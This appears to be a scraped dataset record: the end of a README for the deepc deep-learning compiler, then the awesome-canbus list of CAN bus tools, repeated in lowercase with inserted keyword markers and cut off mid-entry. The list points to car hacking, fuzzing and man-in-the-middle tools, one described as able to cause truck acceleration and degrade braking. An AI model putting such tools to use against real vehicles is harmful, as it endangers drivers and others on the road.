model- read this article or watch this video\nuse deepc with a docker file\nsee more examples in tutorial dir.\n\ud83d\udcdb what is deepc?\ndeepc library, compiler and inference framework is designed to enable and perform deep learning neural networks by focussing on features of small form-factor devices like micro-controllers, efpgas, cpus and other embedded devices like raspberry-pi, odroid, arduino, sparkfun edge, risc-v, mobile phones, x86 and arm laptops among others.\ndeepc also offers ahead of time compiler producing optimized executable based on llvm compiler -----> tool !!!  chain specialized for deep neural networks with onnx as front end.\n\ud83d\udcdd design\nmain components of deepc have been designed to represent and optimize the common deep learning networks in high level graph ir and to transform the computation graph to minimize memory utilization, optimize data layout and fuse computation patterns for different hardware backends.\nread more at high level design document\n\ud83d\udca7 prerequisites\nonnx 1.5\nllvm 8.0\npython 3.6\nswig 3.0\n\ud83d\udcbb development\nbuild and start modifying deepc locally from source code with following steps\n\u2b55 ubuntu 18.04\nfollow the steps to install pre-requisites\nsudo apt-get update\nsudo apt-get install build-essential python3.6-dev python3-pip swig doxygen clang-format clang clang-8 llvm-8 llvm-8-dev protobuf-compiler libprotoc-dev\nsudo pip3 install numpy==1.15.0 onnx==1.5.0\nonce you are done, build deepc\ngit clone https://github.com/ai-techsystems/deepc.git\ncd deepc\nmake\n\u2b55 mac os / windows 10\nmake sure you have the below pre-requisites\nmac os:\npython for mac\ndocker for mac\nwindows 10:\npython for windows\ndocker for windows\nonce you are done, build deepc inside docker container\ngit clone https://github.com/ai-techsystems/deepc.git\ncd deepc\npython builddocker.py\n\ud83d\udcdc output\nfind include src swig -name \\*.h -print0 -o -name \\*.cpp -print0 | xargs -0 -p8 -n1 clang-format -i\nmake -c src\nmake[1]: entering directory 'deepc/src'\nmake -c core\nmake[2]: entering directory 'deepc/src/core'\ncompiling broadcast.cpp\n/usr/bin/g++ -o3 -wall -std=c++14 -fpic -march=native -msse2 \\\n-isystem ./packages/eigen-eigen-323c052e1731 -i./include \\\n-c broadcast.cpp -o obj/broadcast.o\ncompiling tensor.cpp\n...\n...\n/usr/bin/g++ -shared ./obj/dnnc_swig.o ./obj/dnnc_pyutils.o ./obj/dnnc_api.o -o lib/libdnnc.so\nln -s -f lib/libdnnc.so _dnnc.so\n/usr/bin/python3 ../test/swig/basic.py\ncurrent support\nsupported architectures status\narm \u2714\ufe0f\narmv7 \u2714\ufe0f\narm64 \u2714\ufe0f\namd64 \u2714\ufe0f\nppc64le \u2714\ufe0f\nsupported os distributions status\nlinux ubuntu 18.04 \u2714\ufe0f\nlinux centos 6 \u2714\ufe0f\nlinux arch linux \u2714\ufe0f\nlinux manjaro \u2714\ufe0f\nwindows 1803 and above \u2714\ufe0f\nmac os sierra and above \u2714\ufe0f\n\u2795 contribute\ndnn compiler adopts apache committer model, we aim to create an open source project that is maintained and owned by the community. checkout the contributor guide.\n\ud83d\ude4f acknowledgement\nwe acknowledge the efforts predecessor projects like llvm, onnx etc. to make this project a reality.\n\ud83d\udd75\ufe0f\u200d\u2642\ufe0f why compiler\u2754\ndeepc is targeted towards devices with small formfactor like microcontrollers, which are part of all sorts of household devices: think appliances, cars, and toys. in fact, there are around 30 billion microcontroller-powered devices produced each year. they're cheap, require very little energy, and are very reliable.\nby bringing deep learning models to tiny microcontrollers, we can boost the intelligence of billions of devices that we use in our lives, without relying on expensive hardware or reliable internet connections. imagine smart appliances that can adapt to your daily routine, intelligent industrial sensors that understand the difference between problems and normal operation, and magical toys that can help kids learn in fun and delightful ways.\ncontributors\ncode contributors\nthis project exists because of the people who [contribute]. thanks! \ud83d\ude4f\nfinancial contributors\nbecome a financial contributor and help us sustain our community. [contribute]\nindividuals\norganizations\nsupport this project with your organization. your logo will show up here with a link to your website. [contribute]", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000142, "year": null}, {"Unnamed: 0": 2185, "autor": 145, "date": null, "content": "\ud83d\ude9c A curated list of awesome tools, hardware and resources for CAN bus\nThis list helps a reverse engineering CAN bus devices with lightly specializing in automotive embedded controller software and communication understanding.\nThe another awesome list \u25b6\ufe0f CAN ID collections \u25c0\ufe0f also might be useful.\npermanent URL: https://github.com/iDoka/awesome-canbus\nContents\nHacking and Reverse Engineering tools\nUtils\nCommon\nGUI Tools\nPython Tools\nUDS\nISO-TP\nCAN-over-IP\nOBD-II tools\nJ1939 Tools\nJ2534 Tools\nOther Utils\nLibraries\nExamples\nCAN Databases\nFormats\nDBC\nKCD\nConverters and Parsers\nDBC only\nHardware\nARM\nArduino\nESP\nSBC\nOthers\nHacking and Reverse Engineering tools\nCarHackingTools - Collection of Common Car Hacking Tools a scripts collection to help jump start car research and hacking\nCaring Caribou - A friendly car security exploration tool for the CAN bus\nCAN_Reverse_Engineering - Automated Payload Reverse Engineering Pipeline for the Controller Area Network (CAN) protocol\ncarhacking - Car hacking scripts and docs collection\nReCAN - Reverse engineering of Controller Area Networks\nparse_can_logs - Parse CAN logs and visualize data streams on plot\nreversegear - Offline Reverse Engineering Tools for Automotive Networks\nCANalyzat0r - Security analysis toolkit for proprietary car protocols\nCANToolz - Black-box CAN network analysis framework\nUDSim - Unified Diagnostic Services Simulator and Fuzzer\nGVRET - Generalized Electric Vehicle Reverse Engineering Tool (Arduino FW)\nuds-server - CAN UDS Simulator and Fuzzer\nCANalyse - a vehicle network analysis and attack tool\ncanhack - a low-level CAN protocol hacking library\ncanDrive - tools for hacking your car\nCANghost - automated Script For Hacking Into CAN Bus\nUtils\nCommon\nLinux CAN Utils - Linux-CAN / SocketCAN user space useful utils\ncantools - collection of CLI tools for the CAN bus network\nBUSMASTER - an Open Source Software tool to simulate, analyze and test data bus systems such as CAN\nsignalbroker-server - Tool to read and write CAN/LIN/flexray and other buses using gRPC which allows usage of preferred language\nCANiBUS - CAN Device Vehicle Research Server (OpenGarages.org)\nGUI Tools\nCANdevStudio from GENIVI - CAN simulation software using a drag-and-drop style GUI with interconnected functional blocks\nCANAL-View - Qt GUI for TouCAN USB to CAN bus converter\nwxCAN-Sniffer - CAN bus sniffer (PC side) with animation and chart\nCANLogger - CAN bus logger and analyzer tool\nSeeeed-USB-CAN-Analyzer - Closed source binary for noname Chinese USB-CAN adapter\nCANtact-app Desktop application for CANtact hardware interface\nSavvyCAN - Cross-platform Qt based GUI analysis tool. Supports SocketCAN compatible interfaces.\nopenCanSuite - Set of tools for analyzing, simulating and visualizing a CAN system\nPlotter and Scanner from SmartGauges - scanning and visualizing tool for automotive systems\nICSim - Instrument Cluster Simulator for SocketCAN by OpenGarages\nCANgaroo - Qt-based CAN bus analyzer software\nCAN-X - C# CAN bus analyzer software\nCAN-Monitor-qt - universal CAN bus monitoring program\nCANBUS-Analyzer - development tool/companion software for graphs, displays and analyzes both known and unknown CANBUS packets\nSLSS-CANAnalyser - SLSS CANAnalyser is Windows CAN-Bus-Analysis-Software to show, record and evaluate CAN-Bus signals\nTSMaster - [closed source] powerful open environment for automotive bus monitoring, simulation, testing, diagnostics, calibration and so on\nCAN++ - Windows program for receiving and transmitting CAN bus messages. After import of CAN data base files (*.dbc or *.kcd) CAN signals are shown in symbolic form. In addition they can be shown as graphics (wave forms)\nCANcool - CAN bus Analyser and Simulation Software with CAN-FD support\nKayak - [archived] Java-based CAN traffic GUI analysis tool\nPython Tools\ncantools - CAN BUS tools in Python\npython-can - CAN package provides controller area network support for Python developers\nstrym - real time CAN data logging and visualization tool to work with USB-CAN Interface\ncanviewer - GUI program that allows the inspection of incoming can-bus messages, either from recorder can-bus data or live data\ncan4python - A package for handling CAN bus signals on Linux SocketCAN. Useful for showing the contents of KCD files (also those converted from DBC files)\nPython-Vector-CANoe - Control Vector CANoe API by Python\nCanCat - Swiss army knife of CAN often used in cars and building automation, etc\nPyfuzz_can - may be used in research to inject messages into a truck and cause acceleration, cluster spoofing, and degrade brake performance\nRobotell-USB-CAN-Python - Python program for Robotell USB-CAN Adapter\npython-socketcan-monitor - script to display data from a CAN bus over network interfaces\nCanoPy - A python gui used to visualize and plot message payloads in real time.\nUDS\npython-UDSonCAN - Python implementation of UDS ISO-14229 standard\nuds-c - Unified Diagnostics Service (UDS) and OBD-II C Library\nISO-TP\nisotp-c - An implementation of the ISO-TP (ISO15765-2) CAN protocol in C\nCAN-over-IP\ncannelloni - SocketCAN over Ethernet tunnel\ntincan - Visualization of CAN bus traffic via UDP interface\npican - TCP CAN reader\ncanny - Simple CAN-over-IP gateway\npython-socketcan-monitor - script to display data from a CAN bus over network interfaces\nOBD-II tools\nDDT4All - tool to create your own ECU parameters screens and connect to a CAN network with a cheap ELM327 interface\nELM327SLCAN - ELM327 based vehicle's CAN bus sniffer\nArduino-OBD2-Async - Arduino OBD library with asynchronous data requesting\nCAN-Shark working with OBD PIDs from Arduino + MCP2515 shield\npyvit - Python Vehicle Interface Toolkit\nOBD2-Scantool - A python scantool to read OBD2 info from cars\nO2OO - OBD-II compliant car diagnostic tool. It reads sensor data from a car into an sqlite database\nfreediag - Free diagnostic software for OBD-II compliant motor vehicles\nJ1939 Tools\nJ1939-CANBUS - Supported Engines CAT, Perkins, Wartsalla, MTU, VOLVO\nJ1939-Framework - Framework to work with J1939 Frames used in CAN bus in bus, car and trucks industries\npython-j1939 - SAE J1939 support dependent on python-can package. Provides codec and filtering by PGN but not full SPN decoding\ncan-utils with J1939 support - Fork of can-utils with a few additional tools for J1939\ntest-can-j1939 - how to use CAN J1939 on linux\nlibj1939 - library to work with J1939 Frames (intended to be used in microcontrollers)\nPretty-J1939 - python libs and scripts for pretty-printing J1939 logs\nJ2534 Tools\nJCanalog - Easy To Use J2534 Vehicle Logger\nj2534-tcp - Virtual J2534 driver over TCP/IP\nOther Utils\nSeeeed-USB-CAN-Linux - CLI Linux Support for noname Chinese USB-CAN adapter\nopendlv-device-can-replay - OpenDLV Microservice to replay captured CAN frames to a CAN interface\nc0f - CAN bus fingerprinting tool is designed to analyze CAN bus traffic and fingerprint the Maker and Model\ncanqv - Quick CAN frame inspection using CAN_RAW\nCandle.NET - .NET wrapper for the Candle API for candlelight CAN bus gateways/analysers (e.g. CANable, CANtact, etc)\ncanSerializer - lib for serializing and deserializing CAN frames for transmission over a non CAN transport layer (Can be used to transport CAN frames over UART, SPI, etc)\nLibraries\nlibwecan - header only lib to encode and decode CAN signal\npython-can - the can package provides controller area network support for Python developers\nVCAN - a tiny virtual CAN and CAN-FD bus library in C\nIMCTFD - Improved Microchip CAN Teensy FlexData Library MCP2517FD\ngo-socketcan - Golang library for SocketCAN\nisotp-c - An implementation of the ISO-TP (ISO 15765-2) Support Library in C\nQt CAN Bus - A multiplatform C++ plugin based library with support for various CAN Devices (SocketCAN, Sys Tec, PEAK, Virtual)\nExamples\nCAN-Examples - Example C code for CAN Sockets on Linux\nsocketcan-demo - set of example programs which highlight how to make use of SocketCAN on Linux\nCAN Databases\nFormats\nDBC\nDBC Format Specification v1.0 - Leaked DBC file format specification v1.0 (the obsolete specification)\nDBC Format - Brief explanations about various sections, many examples and explains multiplexed signals well\nDBC File Explained - A Simple Intro to DCB file format\nAn Introduction to J1939 and DBC files\nKCD\nKCD - An open format to describe communication relationships in CAN. similar to DBC format but written in XML\nConverters and Parsers\ncantools by Erik Moqvist - CAN tools in python for DBC, KCD, SYM, ARXML 4 and CDD file parsing\ncantools by Andreas Heitmann - a set of libraries and command line tools for handling ASC, BLF, CLG, VSB, MDF, and DBC files\nCanDB - Generate CAN dbc file with OEM defined CAN matrix (xls)\ncanmatrix - Converting CAN Database Formats .arxml .dbc .dbf .kcd\nCANBabel - Translator for several CAN description formats (supports KCD r/w and DBC read)\ncan4python - A useful package for showing the contents of KCD files (also those converted from DBC files)\ndbcc - DBC to C (and CSV, JSON and XML) compiler using the mpc parser combinator library\nconvert_dbc_to_cpp_file - util for convert dbc (canbus) to cpp(cplusplus) function\nDBC only\nVector DBC - library to access CAN Databases (aka CANdb, aka DBC files) from Vector Informatik\ndbcppp - C/C++ DBC file parser/tool\ncan_decoder - API module for decoding raw CAN bus data to physical values using a DBC CAN database\nCANdb from GENIVI - Library for parsing DBC - CAN bus database description formats\ndbc-parser - A Flex/Bison/Lemon parser/scanner for DBC files\nVector CANdb++ DBC file parser - modified version of the dbc file parser of eerimoq\ndbc_reader - Virtual can bus reader from dbc file (python)\nHardware\nAll kind of HW like CAN bus USB2CAN dongles, loggers, sniffers, adapters, etc.\nARM\nCanDybugFW - Embedded firmware of the CanDybug, a CAN bus traffic analyzer which uses a custom protocol over a USB serial port emulation\nCAN-USB-dongle-fw - slcan firmware for the CVRA CAN to USB dongle\npcan_cantact - PCAN firmware for CANtact ( CANable ) or any other similar boards\npcan_pro_x - PEAK PCAN PRO/PRO FD firmware for STM32F4 based boards\nhadoucan-fw on STM32H750 - Firmware for SM-1301 USB-CAN FD adapter based on\nCANnon - A versatile CAN bootloader for the STM32 and friends\nUSB_CAN-FD on ATSAME51 - This is an Open Source Hardware USB to CAN-FD Interface\nSuperCAN - An open source USB to CAN-FD protocol firmware for ATSAME51\nzubax_babel - High performance CAN-USB/CAN-UART adapter + UAVCAN devboard\ncantact-pro-hw - Hardware for the CANtact Pro, use cantact-pro-fw as firmware\nFlexCAN - Arduino library for CAN on Teensy 3.1, 3.2, 3.5, and 3.6\nBudgetCANv2 - FW for use on STM32G4 microcontroller to implement FDCAN and USB using the STM32 HAL. Tested on BudgetCANv2-HW\nArduino-STM32-CAN - Can communication example for Arduino Core STM32\neXoCAN - CAN Library for the STM32F103 aka Blue Pill\nCAN-BUS-Man-In-The-Middle - Dual CAN MitM-device based on STM32F105\nCAN-Bus-Arduino_Core_STM32 - Lowlevel CanBUS Example for Arduino Core STM32\nCAN-RS485-adapter\nSTM32-CAN-Busadapter - CAN adapter on MCU stm32f303cb\nEthernet-CAN converter - based on STM32F407\nCANBootloader - GUI + CAN booloader protocol\nELM327 - Open-source ELM327 OBD adapter based on LPC1517JDB48\nstm32-CAN-bus-example-HAL-API - A simple example of CAN bus communications between two STM32 microcontrollers using the updated HAL API functions\nCANCAN - CAN recorder based on STM32F407ZGTx\nCAN-to-USB-lawicel-for-stm32 - CAN to USB adapter using Lawicel/Canhacker protocol based on STM32F103\nstm32-slcan - slCAN compatible firmware for BluePill based on STM32f103C8T6\nSTM32duino_CAN_Library - CanBus library for STM32F103 running on STM32duino\nCANBUS_UART - CANBUS to UART for STM32F1 (BluePill and Nucleo boards)\nSTM32F042x based HW\ncandleLight_fw - compatible firmware for candleLight, cantact, canable, CANAlyze, VulCAN\nCANsniffer on STM32F042 - CANbus sniffer less complicated than existing commercial products\ncandleLight - KiCAD project of usb-can adapter based on STM32F0\ncantact-hw - Hardware design files for the CANtact tool, use cantact-fw as firmware source\ncantact - Drivers and Command Line Interface for CANtact tools\nUSB2CAN - Compact and isolated USB-to-CAN Adapter\nCANAlyze - an open source, native CAN interface for Linux that can be built entirely using open source tools, use canalyze-fw as firmware source\nCantact FW by x893\nELM329 - Open-source ELM329 OBD adapter based on STM32F042\nArduino\narduino-canhacker - CanHacker (lawicel) CAN adapter on Arduino + MCP2515\nopen-usb-can from Fabio Baltieri - CAN-to-USB dongle based on ATMega32U and MCP2515\nArduino-CAN-bus-SD-logger - Arduino script to log CAN bus information to SD card. Mainly focused on J1939\nArduino-canbus-monitor - Can bus monitoring tool based on arduino and can bus shield. Implements CAN ASCII/SLCAN protocol compatible with Lawicel CAN232/CANUSB\nArduino-psa-comfort-can-adapter - Arduino sketch to operate new PSA (Peugeot, Citroen, DS, Opel) comfort devices (CAN2010) on old BSI CAN-BUS (CAN2004)\nepasuino - Arduino based Speed sensitive electric power steering for automobiles Speed sensitive electric power steering for automobiles\ncarfuino - Arduino based Automotive performance computer with Megasquirt integration\nW203-canbus - Arduino project for W211/W219 W203/W209 Mercedes (bluetooth audio control and more)\nCANBus-Triple - The car hacking platform based on AVR and MCP2515 works with this firmware\nGVRET - Generalized Electric Vehicle Reverse Engineering Tool (Arduino FW)\nopen-source-can-bridge - gateway with several CAN interfaces based on Xmega\narduino-mcp2515 - Arduino MCP2515 CAN interface library\nslcanuino - USB-CAN (SocketCAN) sketch for Arduino CAN-BUS shield\nCITM02 - CAN In The Middle (CITM) the Dual channel CANBUS adapter built around Arduino\nESP\nESP-IDF-CANBus-Monitor - Monitor Canbus traffic ESP32\nconnected-car - Connecting a Nissan e-NV200 (or Leaf) to MQTT\nPSASteeringWheelAdapter - ESP32 based steering wheel adapter for Peugeot and Citroen cars\nesp32-slcan - ESP32 slcan compatible device\nESP32-Arduino-CAN - Arduino CAN-Bus library for ESP32\nESP32RET - CAN Reverse engineering tool for ESP32 based boards\nESP32_CAN_Interface - Wireless CAN-Interface for the ESP32 which uses the cannelloni protocol to send CAN-Frames via UDP over an Wi-Fi tunnel\nesp32_canbus_gateway - can module on esp32 + tja1050 coded on micropython\nesp32-cantroller - ESP32-S2-WROVER/WROOM based CANBUS controller thingy\nesp32-canbus-logger - CAN bus logger on uSD-card based on ESP32\nESP32_CANViewer - ESP32 based CAN interface for your webbrowser\nesp-idf-can2http - CANbus to http bridge using ESP32\nSBC\nSBC - Single Board Computers\nbeaglebone_black_socketcan - How to get access to the CAN bus on a BeagleBone Black via socketcan interface\nrpi-can-logger - Project to log CAN bus data from a PiCAN2 and a GPS module\nCANoPi - CAN interface for Raspberry Pi Zero\nOthers HW\nMichrochip CAN BUS Analyzer on PIC18F2550/PIC18F2680 Firmware - Michrochip CAN BUS Analyzer firmware\nMichrochip CAN BUS Analyzer on PIC18F2550/PIC18F2680 Driver - Linux kernel driver for Microchip CAN BUS Analyzer Tool\nBB-to-STM32 - LED sync between BeagleBone Black and STM32F4 Discovery Board\nHardware related tools\nCAN Bus Bit Timing Calculator - online tool for obsolete SJA1000 and MCP2510 (probably it works for MCP2515)\nSTM8S208 CAN Speed Calculator - CAN Speed Calculator for STM8 (perhaps it also works for STM32 family)\netc\nFollow this permanent root-repo for lastest updates: https://github.com/iDoka/awesome-canbus\nTags\n#awesome #awesome-list #can #can-bus #canbus #canfd #can-fd #logger #sniffer #slcan #socketcan #car-hacking #bus-monitoring #lawicel #elm327 #obd2 #canutils #automotive #embedded #arduino #rpi #raspberry-pi #sae #uds #j1962 #j1939 #j1979 #j2534 #lin #lin-bus #local-interconnect-network #flexray #obd-ii #slcan-protocol #usbtin #usb2can #iso11898 #iso11565 #iso11765 #iso14229 #dbc #odb #ldf #electric-vehicles #vehicular-networks #python #automotive-security", "link": "https://github.com/iDoka/awesome-canbus", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "\ud83d\ude9c a curated list of awesome tools, hardware and resources for can bus\nthis list helps a reverse engineering can bus devices with lightly specializing in automotive embedded controller software and communication understanding.\nthe another awesome list \u25b6\ufe0f can id collections \u25c0\ufe0f also might be useful.\npermanent url: https://github.com/idoka/awesome-canbus\ncontents\nhacking and reverse engineering tools\nutils\ncommon\ngui tools\npython tools\nuds\niso-tp\ncan-over-ip\nobd-ii tools\nj1939 tools\nj2534 tools\nother utils\nlibraries\nexamples\ncan databases\nformats\ndbc\nkcd\nconverters and parsers\ndbc only\nhardware\narm\narduino\nesp\nsbc\nothers\nhacking and reverse engineering tools\ncarhackingtools - collection of common car hacking tools a scripts collection to help jump start car research and hacking\ncaring caribou - a friendly car security exploration -----> tool !!!  for the can bus\ncan_reverse_engineering - automated payload reverse engineering pipeline for the controller area network (can) protocol\ncarhacking - car hacking scripts and docs collection\nrecan - reverse engineering of controller area networks\nparse_can_logs - parse can logs and visualize data streams on plot\nreversegear - offline reverse engineering tools for automotive networks\ncanalyzat0r - security analysis toolkit for proprietary car protocols\ncantoolz - black-box can network analysis framework\nudsim - unified diagnostic services simulator and fuzzer\ngvret - generalized electric vehicle reverse engineering -----> tool !!!  (arduino fw)\nuds-server - can uds simulator and fuzzer\ncanalyse - a vehicle network analysis and attack -----> tool !!! \ncanhack - a low-level can protocol hacking library\ncandrive - tools for hacking your car\ncanghost - automated script for hacking into can bus\nutils\ncommon\nlinux can utils - linux-can / socketcan user space useful utils\ncantools - collection of cli tools for the can bus network\nbusmaster - an open source software -----> tool !!!  to simulate, analyze and test data bus systems such as can\nsignalbroker-server - -----> tool !!!  to read and write can/lin/flexray and other buses using grpc which allows usage of preferred language\ncanibus - can device vehicle research server (opengarages.org)\ngui tools\ncandevstudio from genivi - can simulation software using a drag-and-drop style gui with interconnected functional blocks\ncanal-view - qt gui for toucan usb to can bus converter\nwxcan-sniffer - can bus sniffer (pc side) with animation and chart\ncanlogger - can bus logger and analyzer -----> tool !!! \nseeeed-usb-can-analyzer - closed source binary for noname chinese usb-can adapter\ncantact-app desktop application for cantact hardware interface\nsavvycan - cross-platform qt based gui analysis -----> tool !!! . supports socketcan compatible interfaces.\nopencansuite - set of tools for analyzing, simulating and visualizing a can system\nplotter and scanner from smartgauges - scanning and visualizing tool for automotive systems\nicsim - instrument cluster simulator for socketcan by opengarages\ncangaroo - qt-based can bus analyzer software\ncan-x - c# can bus analyzer software\ncan-monitor-qt - universal can bus monitoring program\ncanbus-analyzer - development tool/companion software for graphs, displays and analyzes both known and unknown canbus packets\nslss-cananalyser - slss cananalyser is windows can-bus-analysis-software to show, record and evaluate can-bus signals\ntsmaster - [closed source] powerful open environment for automotive bus monitoring, simulation, testing, diagnostics, calibration and so on\ncan++ - windows program for receiving and transmitting can bus messages. after import of can data base files (*.dbc or *.kcd) can signals are shown in symbolic form. in addition they can be shown as graphics (wave forms)\ncancool - can bus analyser and simulation software with can-fd support\nkayak - [archived] java-based can traffic gui analysis tool\npython tools\ncantools - can bus tools in python\npython-can - can package provides controller area network support for python developers\nstrym - real time can data logging and visualization tool to work with usb-can interface\ncanviewer - gui program that allows the inspection of incoming can-bus messages, either from recorder can-bus data or live data\ncan4python - a package for handling can bus signals on linux socketcan. useful for showing the contents of kcd files (also those converted from dbc files)\npython-vector-canoe - control vector canoe api by python\ncancat - swiss army knife of can often used in cars and building automation, etc\npyfuzz_can - may be used in research to inject messages into a truck and cause acceleration, cluster spoofing, and degrade brake performance\nrobotell-usb-can-python - python program for robotell usb-can adapter\npython-socketcan-monitor - script to display data from a can bus over network interfaces\ncanopy - a python gui used to visualize and plot message payloads in real time.\nuds\npython-udsoncan - python implementation of uds iso-14229 standard\nuds-c - unified diagnostics service (uds) and obd-ii c library\niso-tp\nisotp-c - an implementation of the iso-tp (iso15765-2) can protocol in c\ncan-over-ip\ncannelloni - socketcan over ethernet tunnel\ntincan - visualization of can bus traffic via udp interface\npican - tcp can reader\ncanny - simple can-over-ip gateway\npython-socketcan-monitor - script to display data from a can bus over network interfaces\nobd-ii tools\nddt4all - tool to create your own ecu parameters screens and connect to a can network with a cheap elm327 interface\nelm327slcan - elm327 based vehicle's can bus sniffer\narduino-obd2-async - arduino obd library with asynchronous data requesting\ncan-shark working with obd pids from arduino + mcp2515 shield\npyvit - python vehicle interface toolkit\nobd2-scantool - a python scantool to read obd2 info from cars\no2oo - obd-ii compliant car diagnostic tool. it reads sensor data from a car into an sqlite database\nfreediag - free diagnostic software for obd-ii compliant motor vehicles\nj1939 tools\nj1939-canbus - supported engines cat, perkins, wartsalla, mtu, volvo\nj1939-framework - framework to work with j1939 frames used in can bus in bus, car and trucks industries\npython-j1939 - sae j1939 support dependent on python-can package. provides codec and filtering by pgn but not full spn decoding\ncan-utils with j1939 support - fork of can-utils with a few additional tools for j1939\ntest-can-j1939 - how to use can j1939 on linux\nlibj1939 - library to work with j1939 frames (intended to be used in microcontrollers)\npretty-j1939 - python libs and scripts for pretty-printing j1939 logs\nj2534 tools\njcanalog - easy to use j2534 vehicle logger\nj2534-tcp - virtual j2534 driver over tcp/ip\nother utils\nseeeed-usb-can-linux - cli linux support for noname chinese usb-can adapter\nopendlv-device-can-replay - opendlv microservice to replay captured can frames to a can interface\nc0f - can bus fingerprinting tool is designed to analyze can bus traffic and fingerprint the maker and model\ncanqv - quick can frame inspection using can_raw\ncandle.net - .net wrapper for the candle api for candlelight can bus gateways/analysers (e.g. canable, cantact, etc)\ncanserializer - lib for serializing and deserializing can frames for transmission over a non can transport layer (can be used to transport can frames over uart, spi, etc)\nlibraries\nlibwecan - header only lib to encode and decode can signal\npython-can - the can package provides controller area network support for python developers\nvcan - a tiny virtual can and can-fd bus library in c\nimctfd - improved microchip can teensy flexdata library mcp2517fd\ngo-socketcan - golang library for socketcan\nisotp-c - an implementation of the iso-tp (iso 15765-2) support library in c\nqt can bus - a multiplatform c++ plugin based library with support for various can devices (socketcan, sys tec, peak, virtual)\nexamples\ncan-examples - example c code for can sockets on linux\nsocketcan-demo - set of example programs which highlight how to make use of socketcan on linux\ncan databases\nformats\ndbc\ndbc format specification v1.0 - leaked dbc file format specification v1.0 (the obsolete specification)\ndbc format - brief explanations about various sections, many examples and explains multiplexed signals well\ndbc file explained - a simple intro to dcb file format\nan introduction to j1939 and dbc files\nkcd\nkcd - an open format to describe communication relationships in can. similar to dbc format but written in xml\nconverters and parsers\ncantools by erik moqvist - can tools in python for dbc, kcd, sym, arxml 4 and cdd file parsing\ncantools by andreas heitmann - a set of libraries and command line tools for handling asc, blf, clg, vsb, mdf, and dbc files\ncandb - generate can dbc file with oem defined can matrix (xls)\ncanmatrix - converting can database formats .arxml .dbc .dbf .kcd\ncanbabel - translator for several can description formats (supports kcd r/w and dbc read)\ncan4python - a useful package for showing the contents of kcd files (also those converted from dbc files)\ndbcc - dbc to c (and csv, json and xml) compiler using the mpc parser combinator library\nconvert_dbc_to_cpp_file - util for convert dbc (canbus) to cpp(cplusplus) function\ndbc only\nvector dbc - library to access can databases (aka candb, aka dbc files) from vector informatik\ndbcppp - c/c++ dbc file parser/tool\ncan_decoder - api module for decoding raw can bus data to physical values using a dbc can database\ncandb from genivi - library for parsing dbc - can bus database description formats\ndbc-parser - a flex/bison/lemon parser/scanner for dbc files\nvector candb++ dbc file parser - modified version of the dbc file parser of eerimoq\ndbc_reader - virtual can bus reader from dbc file (python)\nhardware\nall kind of hw like can bus usb2can dongles, loggers, sniffers, adapters, etc.\narm\ncandybugfw - embedded firmware of the candybug, a can bus traffic analyzer which uses a custom protocol over a usb serial port emulation\ncan-usb-dongle-fw - slcan firmware for the cvra can to usb dongle\npcan_cantact - pcan firmware for cantact ( canable ) or any other similar boards\npcan_pro_x - peak pcan pro/pro fd firmware for stm32f4 based boards\nhadoucan-fw on stm32h750 - firmware for sm-1301 usb-can fd adapter based on\ncannon - a versatile can bootloader for the stm32 and friends\nusb_can-fd on atsame51 - this is an open source hardware usb to can-fd interface\nsupercan - an open source usb to can-fd protocol firmware for atsame51\nzubax_babel - high performance can-usb/can-uart adapter + uavcan devboard\ncantact-pro-hw - hardware for the cantact pro, use cantact-pro-fw as firmware\nflexcan - arduino library for can on teensy 3.1, 3.2, 3.5, and 3.6\nbudgetcanv2 - fw for use on stm32g4 microcontroller to implement fdcan and usb using the stm32 hal. tested on budgetcanv2-hw\narduino-stm32-can - can communication example for arduino core stm32\nexocan - can library for the stm32f103 aka blue pill\ncan-bus-man-in-the-middle - dual can mitm-device based on stm32f105\ncan-bus-arduino_core_stm32 - lowlevel canbus example for arduino core stm32\ncan-rs485-adapter\nstm32-can-busadapter - can adapter on mcu stm32f303cb\nethernet-can converter - based on stm32f407\ncanbootloader - gui + can booloader protocol\nelm327 - open-source elm327 obd adapter based on lpc1517jdb48\nstm32-can-bus-example-hal-api - a simple example of can bus communications between two stm32 microcontrollers using the updated hal api functions\ncancan - can recorder based on stm32f407zgtx\ncan-to-usb-lawicel-for-stm32 - can to usb adapter using lawicel/canhacker protocol based on stm32f103\nstm32-slcan - slcan compatible firmware for bluepill based on stm32f103c8t6\nstm32duino_can_library - canbus library for stm32f103 running on stm32duino\ncanbus_uart - canbus to uart for stm32f1 (bluepill and nucleo boards)\nstm32f042x based hw\ncandlelight_fw - compatible firmware for candlelight, cantact, canable, canalyze, vulcan\ncansniffer on stm32f042 - canbus sniffer less complicated than existing commercial products\ncandlelight - kicad project of usb-can adapter based on stm32f0\ncantact-hw - hardware design files for the cantact tool, use cantact-fw as firmware source\ncantact - drivers and command line interface for cantact tools\nusb2can - compact and isolated usb-to-can adapter\ncanalyze - an open source, native can interface for linux that can be built entirely using open source tools, use canalyze-fw as firmware source\ncantact fw by x893\nelm329 - open-source elm329 obd adapter based on stm32f042\narduino\narduino-canhacker - canhacker (lawicel) can adapter on arduino + mcp2515\nopen-usb-can from fabio baltieri - can-to-usb dongle based on atmega32u and mcp2515\narduino-can-bus-sd-logger - arduino script to log can bus information to sd card. mainly focused on j1939\narduino-canbus-monitor - can bus monitoring tool based on arduino and can bus shield. implements can ascii/slcan protocol compatible with lawicel can232/canusb\narduino-psa-comfort-can-adapter - arduino sketch to operate new psa (peugeot, citroen, ds, opel) comfort devices (can2010) on old bsi can-bus (can2004)\nepasuino - arduino based speed sensitive electric power steering for automobiles speed sensitive electric power steering for automobiles\ncarfuino - arduino based automotive performance computer with megasquirt integration\nw203-canbus - arduino project for w211/w219 w203/w209 mercedes (bluetooth audio control and more)\ncanbus-triple - the car hacking platform based on avr and mcp2515 works with this firmware\ngvret - generalized electric vehicle reverse engineering tool (arduino fw)\nopen-source-can-bridge - gateway with several can interfaces based on xmega\narduino-mcp2515 - arduino mcp2515 can interface library\nslcanuino - usb-can (socketcan) sketch for arduino can-bus shield\ncitm02 - can in the middle (citm) the dual channel canbus adapter built around arduino\nesp\nesp-idf-canbus-monitor - monitor canbus traffic esp32\nconnected-car - connecting a nissan e-nv200 (or leaf) to mqtt\npsasteeringwheeladapter - esp32 based steering wheel adapter for peugeot and citroen cars\nesp32-slcan - esp32 slcan compatible device\nesp32-arduino-can - arduino can-bus library for esp32\nesp32ret - can reverse engineering tool for esp32 based boards\nesp32_can_interface - wireless can-interface for the esp32 which uses the cannelloni protocol to 